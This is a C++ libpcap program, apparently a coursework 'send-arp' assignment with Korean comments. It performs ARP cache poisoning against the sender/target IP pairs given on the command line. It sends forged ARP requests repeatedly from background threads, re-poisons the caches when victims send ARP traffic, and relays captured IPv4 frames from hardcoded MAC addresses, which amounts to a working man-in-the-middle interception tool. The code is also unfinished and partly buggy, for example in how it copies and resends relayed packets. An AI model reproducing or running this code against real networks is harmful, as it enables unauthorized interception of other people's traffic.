#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <cstring>
#include <map>
#include <thread>
#include <chrono>
#include <queue>
#include <mutex>
#include <condition_variable>

#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac.h"
#include "get_ip.h"


using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

// attacker's address 전역변수
Mac attackerMac;
Ip attackerIp;

// Network, ARPEntry 
pair<Ip, Mac> Attacker;
map<Ip, Mac> SenderNet;
map<Ip, Mac> TargetNet;
map<Ip, Ip> ARPEntry;

pcap_t* handle;
pcap_t* relayhandle;

queue<std::pair<const u_char*, int>> packetQueue;
mutex queueMutex;
condition_variable queueCondVar;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

//Get sender's Mac
Mac send_arp_normal(Ip targetIp){
	EthArpPacket packet; //arp request packet

	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = Mac::broadcastMac(); //broadcast mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);

	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
	packet.arp_.tip_ = htonl(targetIp);
	
	while (true){
   		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               

		const u_char* cap_packet;
		struct pcap_pkthdr* header;
		
		int res = pcap_next_ex(handle, &header, &cap_packet);
		

		if (res == 0) continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
	
		//check ARP Packet
		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
		//Check reply packet
		if(arp_hdr->op()!=ArpHdr::Reply) continue;
		//Check correct sender
		if(arp_hdr->sip()!=targetIp) continue;
		return Mac(static_cast<string>(arp_hdr->smac()));	
	}
	return Mac();
}

//send arp-spoof packet
void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
	// printf("sent to.. %s\n", static_cast<string>(senderMac).c_str());
	
	EthArpPacket packet;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = senderMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	// My mac
	packet.arp_.smac_ = attackerMac;
	// Target ip(gateway)
	packet.arp_.sip_ = htonl(targetIp);

	// Victim
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(targetIp);

	// packet loss대비
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	//printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp) {

	printf("create spoofing thread for %s, %s, \n", 
		static_cast<string>(senderIp).c_str(),
		static_cast<string>(targetIp).c_str());

	while (true) {
		send_arp_spoof(senderMac, senderIp, targetIp);
		this_thread::sleep_for(chrono::seconds(1)); // Wait for 1 second
	}
}



void relay_thread(const u_char* cap_packet, int packet_size) {
	
	
    // Create a non-const copy of the packet
    EthArpPacket packet_copy;
    memcpy(&packet_copy, cap_packet, sizeof(EthArpPacket));
	cout<<"send "<<static_cast<string>(packet_copy.eth_.smac())<<endl;


	// src mac
	// fix senderMAC -> AttackerMac

	// dst mac
	// fix AttackerMAC -> targetMAC

	// Modify the copy of the packet if necessary
    packet_copy.eth_.smac_ = attackerMac;
	// packet_copy.eth_.dmac_ = Mac("58:86:94:CC:B1:6C");


    // Forward the modified packet to the original destination
    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_copy), packet_size);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}

	//인터페이스 확인 후 예외처리하기.... 코드작성
	const char* interf = argv[1]; //interface

	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
		return -1;
	}

	// address init
	string interface = interf;

	attackerMac = get_mac(interface);
	attackerIp = get_ip(interface);
	Attacker = (make_pair(attackerIp, attackerMac));

	// Process each (Sender, Target) pair
	for (int i = 2; i < argc; i += 2) {
		Ip senderIp = Ip(argv[i]);      // Sender IP
		Mac senderMac;
		//이미 입력된 IP인지 확인
		if(SenderNet.find(senderIp)==SenderNet.end()){
			senderMac = send_arp_normal(senderIp);
			SenderNet.insert(make_pair(senderIp, senderMac));
		}
		// TargetNet에 있으면
		else if(TargetNet.find(senderIp)!=TargetNet.end()){
			senderMac = TargetNet[senderIp];
			SenderNet.insert(make_pair(senderIp, senderMac));
		}

		Ip targetIp = Ip(argv[i + 1]); // Target IP
		Mac targetMac;
		//ARPEntry에 있는 IP인지 확인
		if(TargetNet.find(targetIp)==TargetNet.end()){
			targetMac = send_arp_normal(targetIp);
			TargetNet.insert(make_pair(targetIp, targetMac));
		}
		// SenderNet에 있으면
		else if(SenderNet.find(senderIp)!=SenderNet.end()){
			targetMac = SenderNet[targetIp];
			TargetNet.insert(make_pair(targetIp, targetMac));
		}

		ARPEntry.insert(make_pair(senderIp, targetIp));

		send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
		// printf("sent arp spoof\n");

		thread spoofThread(arp_spoofing_thread, senderMac, senderIp, targetIp);
		spoofThread.detach();
	}


	const u_char* cap_packet;
	struct pcap_pkthdr* header;

	while(true){
		// packet capture
		int res = pcap_next_ex(handle, &header, &cap_packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// check packet
		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);

		// endian hard change..
		if (eth_arp_pkt->eth_.type()== EthHdr::Ip4 && (eth_arp_pkt->eth_.smac()==Mac("CC:6B:1E:3E:67:DD")||eth_arp_pkt->eth_.smac()==Mac("58:86:94:CC:B1:6C"))){
			// eth_arp_pkt->eth_.smac().print();
			// eth_arp_pkt->eth_.dmac().print();

			
			thread relayThread(relay_thread, cap_packet, header->caplen);
			relayThread.detach();		

			//
			//&&!eth_arp_pkt->eth_.dmac().isBroadcast()
			//&& 

			// not ARP, packet's senderIP is in my sender Network -> packet 

			//relay
			//origin packet = senderIP, MAC, targetIP, MAC
			//infectoin packet = senderIP, MAC, targetIP, AttackerMac
			//relay pakcet = senderIP, AttackerMAC, targetIP, targetMAC

			// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
			// if (res != 0) {
			// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			// }

			

			//arp_hdr->smac_ = TargetNet[eth_arp_pkt->arp_.tip_];

	

			// 공격 대상의 sender의 ARP 패킷이면
			// 센더 - 어택 -> 타겟 브로드 relay
			// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
			// Ip senderIp = arp_hdr->sip();
			// Ip targetIp = arp_hdr->tip();
			// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
			

		
		}
		else if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
			// if sender and target ip not in the Network 

			Ip senderIp = arp_hdr->sip();
			Mac senderMac = SenderNet[senderIp];
			Ip targetIp = arp_hdr->tip();

			// 저장하고있는 ip에서 src, dst가 하나도 해당되지 않으면 
			if(SenderNet.find(senderIp)==SenderNet.end() && TargetNet.find(targetIp)==TargetNet.end()) continue;

			
			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
			if(SenderNet.find(senderIp)!=SenderNet.end() && ARPEntry[senderIp]!=targetIp) continue;

			// Sender and Target's Request "Who are you??"
			if(arp_hdr->tmac().isBroadcast() && (SenderNet.find(senderIp)!=SenderNet.end()||TargetNet.find(senderIp)!=TargetNet.end())){
				send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
			}

			// target's reply "You.. Gateway is ME"
			if(arp_hdr->op()==ArpHdr::Reply&&SenderNet.find(targetIp)!=SenderNet.end()){
				send_arp_spoof(SenderNet[targetIp], targetIp,senderIp);
			}

			// sip가 센더혹은 타겟이면서 sip가 센더일 때 tip가 센더의 타켓이 아닌 패킷만 남음
			// 타겟의 ARP 받으면 무조건 ARP 날리기	

			send_arp_spoof(SenderNet[senderIp], senderIp,targetIp);
		}
	}

	pcap_close(handle);
}